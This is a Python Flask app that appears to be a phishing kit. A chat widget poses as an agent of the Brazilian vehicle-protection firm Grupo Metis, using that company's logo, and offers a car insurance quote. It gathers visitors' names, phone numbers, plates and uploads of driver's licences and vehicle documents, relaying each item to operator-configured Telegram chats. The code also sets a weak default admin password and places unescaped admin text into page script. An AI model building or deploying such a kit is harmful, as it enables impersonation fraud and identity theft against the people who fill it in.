# Car Insurance Lead Bot - With Admin Panel & Multiple Telegram Destinations
from flask import Flask, render_template_string, request, jsonify, redirect, session
import requests
import os
import json
import uuid
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-here')

# Configuration
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# In-memory storage (use database in production)
conversations = {}

# Default configuration
bot_config = {
    "telegram_destinations": [
        {
            "id": "default",
            "name": "Telegram Principal",
            "token": os.environ.get('TELEGRAM_BOT_TOKEN', ''),
            "chat_id": os.environ.get('TELEGRAM_CHAT_ID', '@Toustten'),
            "enabled": True
        }
    ],
    "greeting": "Ola, espero que esteja tudo bem com voce. Sou o Gustavo Melo, faco parte do Grupo Metis de protecao veicular. Para que eu possa esta providenciando sua cotacao vou precisar de algumas informacoes.",
    "steps": [
        {"id": "nome", "question": "Para comecar, qual seu nome completo?", "enabled": True, "order": 1},
        {"id": "cidade", "question": "De qual cidade voce fala?", "enabled": True, "order": 2},
        {"id": "veiculo", "question": "Para que eu possa fazer uma cotacao mais exata, me informe a placa e o modelo de seu veiculo?", "enabled": True, "order": 3},
        {"id": "telefone", "question": "E tambem o telefone para contato.", "enabled": True, "order": 4}
    ],
    "documents": [
        {"id": "doc_veiculo", "name": "Documento do Veiculo", "enabled": True},
        {"id": "cnh", "name": "CNH", "enabled": True},
        {"id": "vin", "name": "Foto do VIN", "enabled": False}
    ],
    "messages": {
        "doc_request": "Eu sei que ja pedi todas estas informacoes. Mas, poderia enviar os documentos abaixo?",
        "doc_received": "Documento recebido com sucesso!",
        "final_question": "Obrigado por todos estes detalhes, gostaria de acrescentar algo mais antes de eu comecar a trabalhar na sua cotacao?",
        "goodbye": "Perfeito! Vou preparar sua cotacao e entrar em contato em breve. Obrigado pela confianca!"
    },
    "appearance": {
        "logo_url": "https://metisbrasil.com.br/wp-content/uploads/2025/06/metis-logo.png",
        "primary_color": "#1e88e5",
        "secondary_color": "#0d47a1"
    },
    "settings": {
        "send_partial_updates": True
    }
}

def get_enabled_steps():
    """Get enabled steps sorted by order"""
    steps = [s for s in bot_config["steps"] if s["enabled"]]
    return sorted(steps, key=lambda x: x["order"])

def get_enabled_documents():
    """Get enabled documents"""
    return [d for d in bot_config["documents"] if d["enabled"]]

def get_enabled_telegram_destinations():
    """Get enabled Telegram destinations"""
    return [t for t in bot_config["telegram_destinations"] if t["enabled"] and t["token"] and t["chat_id"]]

def send_telegram_photo_to_dest(photo_data, caption, filename, dest):
    """Send photo to a specific destination"""
    try:
        url = f"https://api.telegram.org/bot{dest['token']}/sendPhoto"
        files = {'photo': (filename, photo_data, 'image/jpeg')}
        data = {'chat_id': dest['chat_id'], 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def send_telegram_doc_to_dest(doc_data, caption, filename, dest):
    """Send document to a specific destination"""
    try:
        url = f"https://api.telegram.org/bot{dest['token']}/sendDocument"
        files = {'document': (filename, doc_data, 'application/pdf')}
        data = {'chat_id': dest['chat_id'], 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def send_message_to_dest(text, dest):
    """Send text message to a specific destination"""
    try:
        url = f"https://api.telegram.org/bot{dest['token']}/sendMessage"
        payload = {"chat_id": dest['chat_id'], "text": text}
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_photo_to_all(photo_data, caption, filename):
    """Send photo to all enabled destinations"""
    destinations = get_enabled_telegram_destinations()
    results = []
    for dest in destinations:
        success = send_telegram_photo_to_dest(photo_data, caption, filename, dest)
        results.append((dest['name'], success))
    return results

def send_doc_to_all(doc_data, caption, filename):
    """Send document to all enabled destinations"""
    destinations = get_enabled_telegram_destinations()
    results = []
    for dest in destinations:
        success = send_telegram_doc_to_dest(doc_data, caption, filename, dest)
        results.append((dest['name'], success))
    return results

def send_text_to_all(text):
    """Send text to all enabled destinations"""
    destinations = get_enabled_telegram_destinations()
    results = []
    for dest in destinations:
        success = send_message_to_dest(text, dest)
        results.append((dest['name'], success))
    return results

def send_update_to_telegram(session_id, conv):
    """Send update to all Telegram destinations"""
    # Check if partial updates are enabled
    if not bot_config.get("settings", {}).get("send_partial_updates", True):
        return
    
    info = conv.get('info', {})
    docs = conv.get('docs', {})
    
    enabled_docs = get_enabled_documents()
    doc_status = ""
    for doc in enabled_docs:
        status = "✅" if docs.get(doc["id"]) else "❌"
        doc_status += f"\n• {doc['name']}: {status}"
    
    text = f"""📝 ATUALIZACAO - GRUPO METIS

👤 Nome: {info.get('nome', '---')}
🏙️ Cidade: {info.get('cidade', '---')}
🚗 Veiculo: {info.get('veiculo', '---')}
📞 Telefone: {info.get('telefone', '---')}
📎 Documentos:{doc_status}

Sessao: {session_id[:10]}"""
    
    return send_text_to_all(text)

def generate_bot_html():
    """Generate bot HTML with current config"""
    color = bot_config["appearance"]["primary_color"]
    secondary = bot_config["appearance"]["secondary_color"]
    logo = bot_config["appearance"]["logo_url"]
    greeting = bot_config["greeting"]
    
    steps = get_enabled_steps()
    first_question = steps[0]["question"] if steps else "Qual seu nome?"
    
    return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grupo Metis</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, {color} 0%, {secondary} 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }}
        .chat-container {{ width: 100%; max-width: 420px; height: 85vh; background: white; border-radius: 24px; box-shadow: 0 25px 80px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow: hidden; }}
        .chat-header {{ background: #f8f9fa url('{logo}') center/70% no-repeat; min-height: 150px; border-bottom: 3px solid {color}; }}
        .chat-messages {{ flex: 1; overflow-y: auto; padding: 20px; }}
        .message {{ max-width: 85%; padding: 14px 18px; border-radius: 20px; margin-bottom: 10px; font-size: 0.95rem; line-height: 1.4; animation: fadeIn 0.3s ease; }}
        @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(10px); }} to {{ opacity: 1; transform: translateY(0); }} }}
        .message.bot {{ background: #f0f2f5; color: #1a1a1a; margin-right: auto; border-bottom-left-radius: 6px; }}
        .message.user {{ background: linear-gradient(135deg, {color} 0%, {secondary} 100%); color: white; margin-left: auto; border-bottom-right-radius: 6px; }}
        .chat-input {{ padding: 18px; border-top: 1px solid #e8e8e8; display: flex; gap: 12px; background: #fafafa; align-items: center; }}
        .chat-input input[type="text"] {{ flex: 1; padding: 14px 20px; border: 2px solid #e0e0e0; border-radius: 28px; font-size: 0.95rem; outline: none; transition: border-color 0.3s; }}
        .chat-input input[type="text"]:focus {{ border-color: {color}; }}
        .chat-input button {{ width: 50px; height: 50px; border: none; border-radius: 50%; background: linear-gradient(135deg, {color} 0%, {secondary} 100%); color: white; font-size: 1.2rem; cursor: pointer; transition: transform 0.2s; }}
        .chat-input button:hover {{ transform: scale(1.05); }}
        .file-btn {{ width: 50px; height: 50px; border: 2px solid {color}; border-radius: 50%; background: white; color: {color}; font-size: 1.4rem; cursor: pointer; transition: all 0.2s; }}
        .file-btn:hover {{ background: {color}; color: white; }}
        .file-input {{ display: none; }}
        @media (max-width: 480px) {{ body {{ padding: 0; }} .chat-container {{ height: 100vh; border-radius: 0; }} }}
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="chat-header"></div>
        <div class="chat-messages" id="messages"></div>
        <div class="chat-input">
            <input type="file" id="fileInput" class="file-input" accept="image/*,.pdf">
            <button class="file-btn" onclick="document.getElementById('fileInput').click()">📎</button>
            <input type="text" id="userInput" placeholder="Digite..." autocomplete="off">
            <button onclick="sendMessage()">➤</button>
        </div>
    </div>
    <script>
        const messagesDiv = document.getElementById('messages');
        const userInput = document.getElementById('userInput');
        const fileInput = document.getElementById('fileInput');
        const sessionId = 'sess_' + Date.now();
        
        function addMessage(text, isUser) {{
            const div = document.createElement('div');
            div.className = 'message ' + (isUser ? 'user' : 'bot');
            div.textContent = text;
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }}
        
        async function sendMessage() {{
            const text = userInput.value.trim();
            if (!text) return;
            addMessage(text, true);
            userInput.value = '';
            try {{
                const response = await fetch('/chat', {{method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify({{message: text, session_id: sessionId}})}});
                const data = await response.json();
                addMessage(data.response, false);
            }} catch (error) {{
                addMessage('Erro. Tente novamente.', false);
            }}
        }}
        
        async function uploadFile(file) {{
            if (!file) return;
            addMessage('Enviando: ' + file.name, true);
            const formData = new FormData();
            formData.append('file', file);
            formData.append('session_id', sessionId);
            try {{
                const response = await fetch('/upload', {{method: 'POST', body: formData}});
                const data = await response.json();
                addMessage(data.message, false);
            }} catch (error) {{
                addMessage('Erro ao enviar arquivo.', false);
            }}
        }}
        
        fileInput.addEventListener('change', (e) => {{ const file = e.target.files[0]; if (file) uploadFile(file); fileInput.value = ''; }});
        userInput.addEventListener('keypress', (e) => {{ if (e.key === 'Enter') sendMessage(); }});
        
        addMessage("{greeting}", false);
        setTimeout(() => addMessage("{first_question}", false), 500);
    </script>
</body>
</html>
"""

# ============== BOT ROUTES ==============

@app.route('/')
def home():
    return generate_bot_html()

@app.route('/chat', methods=['POST'])
def chat():
    data = request.json
    session_id = data.get('session_id', 'default')
    msg = data.get('message', '').strip()
    
    if session_id not in conversations:
        conversations[session_id] = {'step': 0, 'info': {}, 'docs': {}, 'completed': False}
    
    conv = conversations[session_id]
    
    if conv.get('completed'):
        return jsonify({"response": bot_config["messages"]["goodbye"]})
    
    steps = get_enabled_steps()
    step_idx = conv['step']
    
    # Save previous answer
    if step_idx > 0 and step_idx <= len(steps):
        prev_step = steps[step_idx - 1]
        conv['info'][prev_step['id']] = msg
        send_update_to_telegram(session_id, conv)
    
    # Check if we've gone through all text steps
    if step_idx >= len(steps):
        # Check if we need documents
        enabled_docs = get_enabled_documents()
        if enabled_docs and not conv.get('doc_request_sent'):
            conv['doc_request_sent'] = True
            doc_list = "\n".join([f"• {d['name']}" for d in enabled_docs])
            return jsonify({"response": f"{bot_config['messages']['doc_request']}\n\n{doc_list}\n\nClique no botao de anexo 📎 para enviar."})
        
        # All done
        conv['completed'] = True
        send_update_to_telegram(session_id, conv)
        return jsonify({"response": bot_config["messages"]["final_question"]})
    
    # Ask next question
    next_step = steps[step_idx]
    conv['step'] = step_idx + 1
    return jsonify({"response": next_step['question']})

@app.route('/upload', methods=['POST'])
def upload():
    session_id = request.form.get('session_id', 'default')
    
    if session_id not in conversations:
        conversations[session_id] = {'step': 0, 'info': {}, 'docs': {}, 'completed': False}
    
    conv = conversations[session_id]
    
    if conv.get('completed'):
        return jsonify({"message": bot_config["messages"]["goodbye"]})
    
    if 'file' not in request.files:
        return jsonify({"message": "Nenhum arquivo enviado."})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"message": "Arquivo vazio."})
    
    filename = secure_filename(file.filename)
    ext = filename.rsplit('.', 1)[1].lower()
    file_data = file.read()
    
    # Determine which document this is
    enabled_docs = get_enabled_documents()
    doc_type = None
    
    # Check filename for hints
    fname_lower = filename.lower()
    if 'cnh' in fname_lower:
        doc_type = 'cnh'
    elif 'crlv' in fname_lower or 'veiculo' in fname_lower:
        doc_type = 'doc_veiculo'
    elif 'vin' in fname_lower or 'chassi' in fname_lower:
        doc_type = 'vin'
    else:
        # Find first enabled doc not yet received
        for doc in enabled_docs:
            if not conv['docs'].get(doc['id']):
                doc_type = doc['id']
                break
    
    if not doc_type:
        return jsonify({"message": "Todos os documentos ja foram recebidos. Obrigado!"})
    
    # Find doc name
    doc_name = next((d['name'] for d in enabled_docs if d['id'] == doc_type), 'Documento')
    caption = f"📎 {doc_name} - {conv.get('info', {}).get('nome', 'Cliente')}"
    
    # Send to all Telegram destinations
    if ext in ['jpg', 'jpeg', 'png']:
        results = send_photo_to_all(file_data, caption, filename)
    elif ext == 'pdf':
        results = send_doc_to_all(file_data, caption, filename)
    else:
        return jsonify({"message": "Tipo de arquivo nao suportado."})
    
    # Check if any succeeded
    any_success = any(r[1] for r in results)
    
    if any_success:
        conv['docs'][doc_type] = True
        send_update_to_telegram(session_id, conv)
        
        # Check if all docs received
        all_received = all(conv['docs'].get(d['id']) for d in enabled_docs)
        if all_received:
            conv['completed'] = True
            return jsonify({"message": f"{bot_config['messages']['doc_received']} {bot_config['messages']['final_question']}"})
        
        remaining = [d['name'] for d in enabled_docs if not conv['docs'].get(d['id'])]
        if remaining:
            return jsonify({"message": f"{doc_name} recebido! Ainda preciso: {', '.join(remaining)}"})
        
        return jsonify({"message": bot_config["messages"]["doc_received"]})
    
    return jsonify({"message": "Erro ao enviar arquivo. Verifique as configuracoes do Telegram."})

# ============== ADMIN ROUTES ==============

@app.route('/admin')
def admin_login():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin - Grupo Metis</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1e88e5 0%, #0d47a1 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 90%; max-width: 400px; text-align: center; }
            h1 { color: #1e88e5; margin-bottom: 30px; }
            input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 1rem; }
            input:focus { outline: none; border-color: #1e88e5; }
            button { width: 100%; padding: 15px; background: linear-gradient(135deg, #1e88e5 0%, #0d47a1 100%); color: white; border: none; border-radius: 10px; font-size: 1rem; cursor: pointer; margin-top: 20px; }
            button:hover { opacity: 0.9; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 Admin Panel</h1>
            <form method="POST" action="/admin/login">
                <input type="password" name="password" placeholder="Senha de administrador" required>
                <button type="submit">Entrar</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    password = request.form.get('password', '')
    if password == ADMIN_PASSWORD:
        session['admin'] = True
        return redirect('/admin/dashboard')
    return "Senha incorreta. <a href='/admin'>Tentar novamente</a>"

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect('/admin')
    
    # Generate Telegram destinations HTML
    telegram_html = ""
    for dest in bot_config["telegram_destinations"]:
        checked = "checked" if dest["enabled"] else ""
        token_masked = dest["token"][:20] + "..." if len(dest["token"]) > 20 else dest["token"]
        telegram_html += f"""
        <div class="telegram-item" style="border: 2px solid #e0e0e0; border-radius: 12px; padding: 20px; margin-bottom: 15px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <strong>{dest['name']}</strong>
                <label class="toggle-switch">
                    <input type="checkbox" name="tg_enable_{dest['id']}" {checked}>
                    <span class="slider"></span>
                </label>
            </div>
            <div style="margin-bottom: 10px;">
                <label style="display: block; color: #666; font-size: 0.9rem; margin-bottom: 5px;">Bot Token:</label>
                <input type="text" name="tg_token_{dest['id']}" value="{dest['token']}" placeholder="123456789:ABCdef..." style="width: 100%; padding: 10px; border: 2px solid #e0e0e0; border-radius: 8px; font-family: monospace;">
                <small style="color: #999;">Atual: {token_masked}</small>
            </div>
            <div>
                <label style="display: block; color: #666; font-size: 0.9rem; margin-bottom: 5px;">Chat ID:</label>
                <input type="text" name="tg_chat_{dest['id']}" value="{dest['chat_id']}" placeholder="@seu_canal ou 123456789" style="width: 100%; padding: 10px; border: 2px solid #e0e0e0; border-radius: 8px;">
            </div>
        </div>
        """
    
    steps_html = ""
    for step in sorted(bot_config["steps"], key=lambda x: x["order"]):
        checked = "checked" if step["enabled"] else ""
        steps_html += f"""
        <div class="step-item">
            <span class="order">#{step['order']}</span>
            <input type="text" name="step_{step['id']}" value="{step['question']}" class="step-input">
            <label class="toggle">
                <input type="checkbox" name="enable_{step['id']}" {checked}>
                <span>Ativo</span>
            </label>
        </div>
        """
    
    docs_html = ""
    for doc in bot_config["documents"]:
        checked = "checked" if doc["enabled"] else ""
        docs_html += f"""
        <div class="doc-item">
            <span>{doc['name']}</span>
            <label class="toggle-switch">
                <input type="checkbox" name="doc_{doc['id']}" {checked}>
                <span class="slider"></span>
            </label>
        </div>
        """
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Dashboard - Grupo Metis</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Segoe UI', sans-serif; background: #f5f7fa; min-height: 100vh; }}
            .header {{ background: linear-gradient(135deg, #1e88e5 0%, #0d47a1 100%); color: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }}
            .header h1 {{ font-size: 1.5rem; }}
            .header a {{ color: white; text-decoration: none; padding: 8px 16px; background: rgba(255,255,255,0.2); border-radius: 8px; }}
            .container {{ max-width: 1200px; margin: 0 auto; padding: 30px; }}
            .section {{ background: white; border-radius: 16px; padding: 30px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }}
            .section h2 {{ color: #1e88e5; margin-bottom: 20px; font-size: 1.3rem; }}
            textarea {{ width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 1rem; resize: vertical; min-height: 100px; }}
            textarea:focus {{ outline: none; border-color: #1e88e5; }}
            .step-item {{ display: flex; align-items: center; gap: 15px; padding: 15px; background: #f8f9fa; border-radius: 10px; margin-bottom: 10px; }}
            .step-item .order {{ background: #1e88e5; color: white; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-weight: bold; }}
            .step-input {{ flex: 1; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; }}
            .doc-item {{ display: flex; justify-content: space-between; align-items: center; padding: 15px; background: #f8f9fa; border-radius: 10px; margin-bottom: 10px; }}
            .toggle-switch {{ position: relative; width: 60px; height: 30px; }}
            .toggle-switch input {{ opacity: 0; width: 0; height: 0; }}
            .slider {{ position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: #ccc; border-radius: 30px; transition: 0.3s; }}
            .slider:before {{ position: absolute; content: ""; height: 22px; width: 22px; left: 4px; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s; }}
            input:checked + .slider {{ background: #1e88e5; }}
            input:checked + .slider:before {{ transform: translateX(30px); }}
            .save-btn {{ background: linear-gradient(135deg, #1e88e5 0%, #0d47a1 100%); color: white; border: none; padding: 15px 40px; border-radius: 10px; font-size: 1.1rem; cursor: pointer; margin-top: 20px; }}
            .save-btn:hover {{ opacity: 0.9; }}
            .add-btn {{ background: #4caf50; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 15px; }}
            .add-btn:hover {{ opacity: 0.9; }}
            .delete-btn {{ background: #f44336; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }}
            .delete-btn:hover {{ opacity: 0.9; }}
            .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }}
            @media (max-width: 768px) {{ .grid {{ grid-template-columns: 1fr; }} }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🤖 Painel de Administração - Bot Grupo Metis</h1>
            <a href="/admin/logout">Sair</a>
        </div>
        <div class="container">
            <form method="POST" action="/admin/save">
                
                <div class="section">
                    <h2>📱 Destinos Telegram</h2>
                    <p style="color: #666; margin-bottom: 15px;">Configure onde as mensagens serão enviadas. Adicione quantos destinos quiser.</p>
                    
                    {telegram_html}
                    
                    <div style="margin-top: 20px; padding: 20px; background: #e3f2fd; border-radius: 10px;">
                        <h3>➕ Adicionar Novo Destino</h3>
                        <div style="margin-bottom: 10px;">
                            <input type="text" name="new_tg_name" placeholder="Nome (ex: Telegram do Joao)" style="width: 100%; padding: 10px; border: 2px solid #e0e0e0; border-radius: 8px; margin-bottom: 10px;">
                            <input type="text" name="new_tg_token" placeholder="Bot Token" style="width: 100%; padding: 10px; border: 2px solid #e0e0e0; border-radius: 8px; margin-bottom: 10px; font-family: monospace;">
                            <input type="text" name="new_tg_chat" placeholder="Chat ID (@canal ou numero)" style="width: 100%; padding: 10px; border: 2px solid #e0e0e0; border-radius: 8px;">
                        </div>
                    </div>
                </div>
                
                <div class="section">
                    <h2>⚙️ Configurações</h2>
                    <div style="padding: 15px; background: #e3f2fd; border-radius: 10px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <strong>Enviar atualizações parciais</strong>
                                <p style="color: #666; font-size: 0.9rem; margin-top: 5px;">Envia mensagem ao Telegram a cada resposta do cliente</p>
                            </div>
                            <label class="toggle-switch">
                                <input type="checkbox" name="send_partial_updates" {'checked' if bot_config.get('settings', {}).get('send_partial_updates', True) else ''}>
                                <span class="slider"></span>
                            </label>
                        </div>
                    </div>
                </div>
                
                <div class="section">
                    <h2>👋 Mensagem de Boas-vindas</h2>
                    <textarea name="greeting">{bot_config['greeting']}</textarea>
                </div>
                
                <div class="grid">
                    <div class="section">
                        <h2>❓ Perguntas (Ordem)</h2>
                        {steps_html}
                    </div>
                    
                    <div class="section">
                        <h2>📎 Documentos Solicitados</h2>
                        <p style="color: #666; margin-bottom: 15px;">Ative ou desative os documentos que o bot deve pedir:</p>
                        {docs_html}
                    </div>
                </div>
                
                <div class="section">
                    <h2>💬 Mensagens do Bot</h2>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #666;">Mensagem ao pedir documentos:</label>
                        <textarea name="msg_doc_request">{bot_config['messages']['doc_request']}</textarea>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #666;">Mensagem documento recebido:</label>
                        <textarea name="msg_doc_received">{bot_config['messages']['doc_received']}</textarea>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #666;">Pergunta final:</label>
                        <textarea name="msg_final">{bot_config['messages']['final_question']}</textarea>
                    </div>
                    
                    <div>
                        <label style="display: block; margin-bottom: 5px; color: #666;">Mensagem de despedida:</label>
                        <textarea name="msg_goodbye">{bot_config['messages']['goodbye']}</textarea>
                    </div>
                </div>
                
                <div class="section">
                    <h2>🎨 Aparência</h2>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #666;">URL do Logo:</label>
                        <input type="text" name="logo_url" value="{bot_config['appearance']['logo_url']}" style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px;">
                    </div>
                </div>
                
                <div style="text-align: center;">
                    <button type="submit" class="save-btn">💾 Salvar Alterações</button>
                </div>
            </form>
        </div>
    </body>
    </html>
    """

@app.route('/admin/save', methods=['POST'])
def admin_save():
    if not session.get('admin'):
        return redirect('/admin')
    
    # Update Telegram destinations
    for dest in bot_config["telegram_destinations"]:
        dest['enabled'] = f"tg_enable_{dest['id']}" in request.form
        new_token = request.form.get(f"tg_token_{dest['id']}", '').strip()
        new_chat = request.form.get(f"tg_chat_{dest['id']}", '').strip()
        if new_token:
            dest['token'] = new_token
        if new_chat:
            dest['chat_id'] = new_chat
    
    # Add new Telegram destination
    new_name = request.form.get('new_tg_name', '').strip()
    new_token = request.form.get('new_tg_token', '').strip()
    new_chat = request.form.get('new_tg_chat', '').strip()
    
    if new_name and new_token and new_chat:
        new_id = str(uuid.uuid4())[:8]
        bot_config["telegram_destinations"].append({
            "id": new_id,
            "name": new_name,
            "token": new_token,
            "chat_id": new_chat,
            "enabled": True
        })
    
    # Update greeting
    bot_config['greeting'] = request.form.get('greeting', bot_config['greeting'])
    
    # Update steps
    for step in bot_config['steps']:
        new_question = request.form.get(f"step_{step['id']}")
        if new_question:
            step['question'] = new_question
        step['enabled'] = f"enable_{step['id']}" in request.form
    
    # Update documents
    for doc in bot_config['documents']:
        doc['enabled'] = f"doc_{doc['id']}" in request.form
    
    # Update messages
    bot_config['messages']['doc_request'] = request.form.get('msg_doc_request', bot_config['messages']['doc_request'])
    bot_config['messages']['doc_received'] = request.form.get('msg_doc_received', bot_config['messages']['doc_received'])
    bot_config['messages']['final_question'] = request.form.get('msg_final', bot_config['messages']['final_question'])
    bot_config['messages']['goodbye'] = request.form.get('msg_goodbye', bot_config['messages']['goodbye'])
    
    # Update settings
    bot_config['settings']['send_partial_updates'] = 'send_partial_updates' in request.form
    
    # Update appearance
    bot_config['appearance']['logo_url'] = request.form.get('logo_url', bot_config['appearance']['logo_url'])
    
    return "✅ Configurações salvas! <a href='/admin/dashboard'>Voltar ao painel</a> | <a href='/'>Ver bot</a>"

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect('/admin')

@app.route('/favicon.ico')
def favicon():
    return '', 204

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
